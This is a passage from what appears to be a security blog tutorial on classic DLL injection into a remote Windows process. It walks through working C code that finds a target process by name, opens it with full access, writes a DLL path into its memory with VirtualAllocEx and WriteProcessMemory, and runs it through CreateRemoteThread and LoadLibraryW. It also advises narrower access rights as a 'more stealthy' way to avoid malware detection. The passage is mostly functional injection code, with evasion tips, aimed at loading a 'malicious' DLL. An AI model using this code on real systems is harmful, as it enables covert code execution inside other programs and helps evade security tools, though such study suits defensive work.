</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (hSnapShot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateToolhelp32Snapshot Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PROCESSENTRY32	Proc <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32)
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Get details of the first process from the snapshot.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">Process32First</span>(hSnapShot, <span style="color:#f92672">&amp;</span>Proc)) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Process32First Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_EndOfFunction:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapShot <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hSnapShot);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>dwProcessId <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>hProcess <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>As I mentioned previously, we would get a snapshot of the current running processes of the machine and then enumerate them. As the microsoft docs advised us, we should use <code>Process32First</code> for the enumeration. But what are the parameters passed to this function and why did we change the <code>dwSize</code> of the struct <code>PROCESSENTRY32</code> of the <code>Proc</code> struct?</p>
<p>The parameters passed are:</p>
<ul>
<li><code>hSnapShot</code>: This was the returned value from <code>CreateToolhelp32Snapshot</code> which is basically the handle to all the current running processes.</li>
<li><code>&amp;Proc</code>: This is a pointer to a <code>PROCESSENTRY32</code> struct. Why? Well, because processes in Windows are of that type, so basically we tell <code>Process32First</code> to look into the current running processes that are of type <code>PROCESSENTRY32</code> so it knows how to handle and enumerate them.</li>
</ul>
<p>We can also advise microsoft docs on how to use a function, and in this case we should in order to understand why we modify the <code>dwSize</code> value of that struct:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection7.png" alt=""  />
</p>
<p>Now that these are clear, let&rsquo;s start the enumeration:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>	WCHAR LowerName[MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (Proc.szExeFile) {
</span></span><span style="display:flex;"><span>		DWORD dwSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">lstrlenW</span>(Proc.szExeFile);
</span></span><span style="display:flex;"><span>		DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// overwrite LowerName with zero&#39;s
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">RtlSecureZeroMemory</span>(LowerName, <span style="color:#66d9ef">sizeof</span>(LowerName));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Convert Proc.szExeFile to lowercase and store in LowerName.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (dwSize <span style="color:#f92672">&lt;</span> MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>				LowerName[i] <span style="color:#f92672">=</span> (WCHAR)<span style="color:#a6e22e">tolower</span>(Proc.szExeFile[i]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			LowerName[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check if the process name matches the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wcscmp</span>(LowerName, szProcessName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>dwProcessId <span style="color:#f92672">=</span> Proc.th32ProcessID; <span style="color:#75715e">// Save PID.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#f92672">*</span>hProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); <span style="color:#75715e">// Open process handle.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>hProcess <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] OpenProcess Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Move to the next process in the snapshot.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">Process32Next</span>(hSnapShot, <span style="color:#f92672">&amp;</span>Proc));
</span></span></code></pre></div><p>The enumeration does the following three steps:</p>
<ul>
<li>[Step 1]: It declares - and overrites in everyloop - a variable to store the current process name.</li>
<li>[Step 2]: Converts name of the current process to lowercase.</li>
<li>[Step 3]: Compares the lowercase name with the targetProcess name.
<ul>
<li>[Step 3.1]: If a match is found, a handle is returned for that process.</li>
</ul>
</li>
</ul>
<p>Let&rsquo;s see each one of the steps more in depth.</p>
<h5 id="process-enumeration---step-1">Process enumeration - [Step 1]<a hidden class="anchor" aria-hidden="true" href="#process-enumeration---step-1">#</a></h5>
<p>In Step 1, we declare a variable to store the name of the current process in each iteration, and then we overrite it with zero&rsquo;s to clear its memory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WCHAR LowerName[MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Proc.szExeFile) {
</span></span><span style="display:flex;"><span>	DWORD	dwSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">lstrlenW</span>(Proc.szExeFile);
</span></span><span style="display:flex;"><span>	DWORD   i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// overwrite LowerName with zero&#39;s
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">RtlSecureZeroMemory</span>(LowerName, <span style="color:#66d9ef">sizeof</span>(LowerName));
</span></span></code></pre></div><p>Basically, if <code>Proc.szExeFile</code> exists, we get its size based on the name, which we get from the <code>PROCESSENTRY32</code> struct member <code>szExeFile</code>. We can see that from microsoft docs as well:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection8.png" alt=""  />
</p>
<p>Then, we ideally want to clean the memory that the previous loaded process name was stored, so we use <code>RtlSecureZeroMemory</code> for this:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection9.png" alt=""  />
</p>
<h5 id="process-enumeration---step-2">Process enumeration - [Step 2]<a hidden class="anchor" aria-hidden="true" href="#process-enumeration---step-2">#</a></h5>
<p>In Step 2, we basically get each character of the <code>szExeFile</code> member and convert it to lowercase, also casting it to <code>WCHAR</code> type. This is because the target process name is passed as lowercase and is also of type <code>WCHAR</code>, so we want the currently enumerated process to be in the same format in order to compare it with the target one:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (dwSize <span style="color:#f92672">&lt;</span> MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		LowerName[i] <span style="color:#f92672">=</span> (WCHAR)<span style="color:#a6e22e">tolower</span>(Proc.szExeFile[i]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	LowerName[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="process-enumeration---step-3">Process enumeration - [Step 3]<a hidden class="anchor" aria-hidden="true" href="#process-enumeration---step-3">#</a></h3>
<p>In Step 3, we compare the current process name with the target one. If a match is found, we store its process ID, and then we try to get a handle to that process with <code>OpenProcess</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check if the process name matches the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wcscmp</span>(LowerName, szProcessName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>dwProcessId <span style="color:#f92672">=</span> Proc.th32ProcessID; <span style="color:#75715e">// Save PID.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#f92672">*</span>hProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); <span style="color:#75715e">// Open process handle.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>hProcess <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] OpenProcess Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Move to the next process in the snapshot.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">Process32Next</span>(hSnapShot, <span style="color:#f92672">&amp;</span>Proc));
</span></span></code></pre></div><p>We can always look the microsoft docs to understand why we pass these values in the <code>OpenProcess</code>, but here is the syntax of it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE <span style="color:#a6e22e">OpenProcess</span>(
</span></span><span style="display:flex;"><span>  [in] DWORD dwDesiredAccess,
</span></span><span style="display:flex;"><span>  [in] BOOL  bInheritHandle,
</span></span><span style="display:flex;"><span>  [in] DWORD dwProcessId
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><fieldset class="fieldset-wrapper">
	<center><legend><b>Note</b></legend></center><br>
	<p><b>A more stealthy approach for the dwDesiredAccess value would be PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD instead of PROCESS_ALL_ACCESS.</b></p>
	<p><b>This is why PROCESS_ALL_ACCESS is really noisy as it asks for all possible access permisions, while the other approach asks for only what is needed.</b></p>
	<p><b>This could result in flagging the script as malware more easily, but since this is just a PoC, we can ignore it for now.</b></p>
</fieldset>
<p>If a handle is returned back successfully, the loop ends. If not, the corresponding error is printed on the screen and if no match was found in the first place, the enumeration continues with <code>Process32Next</code>.</p>
<h4 id="injectdllremoteprocess---injecting-the-dll-to-the-remote-process">InjectDllRemoteProcess - Injecting the DLL to the remote process<a hidden class="anchor" aria-hidden="true" href="#injectdllremoteprocess---injecting-the-dll-to-the-remote-process">#</a></h4>
<p>After the <code>GetRemoteProcessHandle</code> function is finished and we have gotten back a handle to the target process, it is time to inject our DLL into that process. All we need is a handle to that process and the path to our DLL to inject:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Inject the DLL into the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">InjectDllToRemoteProcess</span>(hProcess, wideFullPath)) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] DLL injection failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hProcess);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s dive into this function responsible for the injection:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">InjectDllToRemoteProcess</span>(IN HANDLE hProcess, IN LPWSTR DllName) {
</span></span><span style="display:flex;"><span>	BOOL bSTATE <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>	LPVOID pLoadLibraryW <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	LPVOID pAddress <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Calculate size of the DLL path in bytes (including null terminator).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwSizeToWrite <span style="color:#f92672">=</span> (<span style="color:#a6e22e">lstrlenW</span>(DllName) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	SIZE_T lpNumberOfBytesWritten <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	HANDLE hThread <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Fetch LoadLibraryW address from kernel32.dll.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pLoadLibraryW <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), <span style="color:#e6db74">&#34;LoadLibraryW&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pLoadLibraryW <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] GetProcAddress Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Allocate memory in the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(hProcess, NULL, dwSizeToWrite, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pAddress <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] VirtualAllocEx Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] pAddress Allocated At : 0x%p Of Size : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pAddress, dwSizeToWrite);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; To Write ... &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Write the DLL name to the allocated memory in the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteProcessMemory</span>(hProcess, pAddress, DllName, dwSizeToWrite, <span style="color:#f92672">&amp;</span>lpNumberOfBytesWritten) <span style="color:#f92672">||</span> lpNumberOfBytesWritten <span style="color:#f92672">!=</span> dwSizeToWrite) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] WriteProcessMemory Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Successfully Written %d Bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpNumberOfBytesWritten);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; To Run ... &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a remote thread to execute LoadLibraryW in the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hThread <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateRemoteThread</span>(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateRemoteThread Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] DONE !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Close thread handle after execution.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">CloseHandle</span>(hThread);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function basically takes as arguments only what is needed for the DLL Injection:</p>
<ul>
<li><code>hProcess</code>: the process handle we want to inject the dll into.</li>
<li><code>DllName</code>: The dll we want to inject into the process.</li>
</ul>
<p>The most important parts that we must highlight are the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pLoadLibraryW <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), <span style="color:#e6db74">&#34;LoadLibraryW&#34;</span>);
</span></span></code></pre></div><p>This part of the code retrieves the address of the LoadLibraryW function from kernel32.dll using the GetModuleHandle and GetProcAddress functions.</p>
<fieldset class="fieldset-wrapper">
	<center><legend><b>Note</b></legend></center><br>
	<p><b>This is possible because kernel32.dll is loaded into every process, and its base address is consistent across all processes on a given system during a single boot session (due to how Windows implements ASLR for certain system libraries).</b></p>
	<p><b>Even though ASLR randomizes the base address of kernel32.dll after every system reboot, during any single boot, all processes will have the same base address for this module. This allows us to calculate the address of the LoadLibraryW within kernel32.dll in our process and based on the address we find, use the same one for the remote target process we want to inject the dll into. This technique leverages the shared base address of kernel32.dll across processes, allowing us to locate Windows API libraries in different processes.</b></p>
</fieldset>
<p>The next part of the code that is of importance is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(hProcess, NULL, dwSizeToWrite, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
</span></span></code></pre></div><p>This line allocates memory using the VirtualAllocEx API, to allocate memory in a different process tham our own process.</p>
<p>The structure of VirtualAllocEx is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">VirtualAllocEx</span>(
</span></span><span style="display:flex;"><span>  [in]           HANDLE hProcess,			<span style="color:#75715e">// handle to the process we want to allocate memory.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in, optional] LPVOID lpAddress,			<span style="color:#75715e">// desired starting address - we don&#39;t really care.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in]           SIZE_T dwSize,				<span style="color:#75715e">// size of the path of the DLL to be injected.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in]           DWORD  flAllocationType,	<span style="color:#75715e">// memory allocation type.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in]           DWORD  flProtect			<span style="color:#75715e">// page protection - the page that was previously specified in flAllocationType.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span></code></pre></div><p><strong>flAllocationType</strong>: For the allocation type we used <code>MEM_COMMIT | MEM_RESERVE</code> in order to reverse a chunk of the target process and commit it immediately.</p>
<p><strong>flProtect</strong>: For the protection of the page that was reserved and commited, we use <code>PAGE_READWRITE</code> for read and write, otherwise <code>WriteProcessMemory</code> (we will see this shortly) won&rsquo;t be able to write, and <code>LoadLibraryW</code> wouldn&rsquo;t be able to read.</p>
<p>After the memory has been successfully allocated in the remote target process, we now need to write to the allocated buffer (the reserved and commited page). We will use the <code>WriteProcessMemory</code> for that purpose in order to write the DLL&rsquo;s path/name in the allocated memory.</p>
<p>The structure of the <code>WriteProcessMemory</code> is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">WriteProcessMemory</span>(
</span></span><span style="display:flex;"><span>  [in]  HANDLE  hProcess,               <span style="color:#75715e">// A handle to the process whose memory to be written to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in]  LPVOID  lpBaseAddress,          <span style="color:#75715e">// Base address in the specified process to which data is written
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in]  LPCVOID lpBuffer,               <span style="color:#75715e">// A pointer to the buffer that contains data to be written to &#39;lpBaseAddress&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [in]  SIZE_T  nSize,                  <span style="color:#75715e">// The number of bytes to be written to the specified process.	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [out] SIZE_T  <span style="color:#f92672">*</span>lpNumberOfBytesWritten <span style="color:#75715e">// A pointer to a &#39;SIZE_T&#39; variable that receives the number of bytes actually written
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span></code></pre></div><p>We therefore use this API in order to write the Dll path/name to the <code>pAddress</code> of the <code>hProcess</code> (the address returned from the previous memory allocation inside the remote target process):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteProcessMemory</span>(hProcess, pAddress, DllName, dwSizeToWrite, <span style="color:#f92672">&amp;</span>lpNumberOfBytesWritten) <span style="color:#f92672">||</span> lpNumberOfBytesWritten <span style="color:#f92672">!=</span> dwSizeToWrite)
</span></span></code></pre></div><p>If everything is correct, then by now we should have:</p>
<ul>
<li>allocated memory into the remote target process.</li>
<li>written the dll path/name inside that allocated memory.</li>
</ul>
<p>Only thing that is left to do is create a remote thread into that process which will basically just load the path/name of the dll written into that address, resulting in its execution!</p>
<p>Based on that, the last line of interest is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hThread <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateRemoteThread</span>(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
</span></span></code></pre></div><p>The <code>CreateRemoteThread</code> API creates a remote thread inside the <code>hProcess</code> (the remote target process), and specifies to that thread that it should use the <code>LoadLibraryW</code> API to load whatever is inside <code>pAddress</code> (which is the path of the DLL written previously).</p>
<p>Seeing that in action:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection10.png" alt=""  />
</p>
<p>Until now, memory has been allocated into the remote target process. If we press Enter, the path of the dll will be written in that allocated memory. Let&rsquo;s open x64dbg to observe that:</p>
<p><img loading="lazy" src="/posts/dllinjection/allocating_memory.gif" alt=""  />
</p>
<p>We observe that indeed the dll path has been loaded, but what about running it? Let&rsquo;s press one more Enter of the LoadLibraryW to take place and load that written dll path, resulting in its execution:</p>
<p><img loading="lazy" src="/posts/dllinjection/loading_written_dll.gif" alt=""  />
</p>
<p>We once again see within Process Hacker that indeed our malicious dll has been loaded:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection11.png" alt=""  />
</p>
<p>Overall, the whole code is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
